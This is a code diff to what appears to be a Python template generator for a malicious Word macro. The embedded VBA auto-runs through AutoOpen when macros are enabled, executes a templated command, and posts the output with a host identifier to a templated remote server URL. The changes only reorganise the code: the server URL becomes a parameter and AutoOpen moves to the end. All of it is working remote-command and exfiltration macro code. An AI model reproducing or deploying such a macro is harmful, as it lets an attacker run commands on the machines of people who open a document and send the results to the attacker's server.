@@ -372,22 +372,17 @@ End Sub
 REMOTE_CMD = \
 r"""
 
-Dim serverUrl As String
-
-' Auto launch when VBA enabled
-Sub AutoOpen()
-    Main
-End Sub
 
 Private Sub Main()
     Dim msg As String
+    Dim serverUrl As String
     serverUrl = "<<<TEMPLATE>>>"
     msg = "<<<TEMPLATE>>>"
     On Error GoTo byebye
     msg = ExecuteCmdSync(msg)
     On Error Resume Next
     Err.Clear
-    SendResponse msg
+    SendResponse serverUrl, msg
     On Error GoTo 0
     byebye:
 End Sub
@@ -418,15 +413,20 @@ Private Function GetId() As String
 End Function
 
 'To send response for command'
-Private Function SendResponse(cmdOutput)
+Private Function SendResponse(theTargetUrl As String, cmdOutput As String)
     Dim data As String
     Dim response As String
     Dim hostId As String
     hostId = GetId()
     data = "id=" &  hostId &  "&cmdOutput=" & cmdOutput
-    SendResponse = HttpPostData(serverUrl, data)
+    SendResponse = HttpPostData(theTargetUrl, data)
 End Function
 
+
+' Auto launch when VBA enabled
+Sub AutoOpen()
+    Main
+End Sub
 
 """
 
